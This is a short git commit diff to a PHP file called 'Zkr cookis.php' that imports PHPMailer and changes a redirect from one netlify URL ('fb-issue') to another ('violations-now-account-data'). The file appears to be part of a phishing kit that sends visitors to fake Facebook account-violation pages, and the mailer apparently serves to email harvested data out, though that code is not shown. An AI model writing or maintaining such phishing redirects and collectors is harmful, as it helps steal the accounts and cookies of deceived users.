12f6380aaa3c345ebd5bb411bf190ad5daff6de2
Lernamzaxal892 <lernayouamzaxal@gmail.com>
2025-08-12 15:39:20 +0500

    Update Zkr cookis.php

--- Zkr cookis.php
+++ Zkr cookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://famous-queijadas-03d165-fb-issue.netlify.app/");
+header("Location: https://violations-now-account-data.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
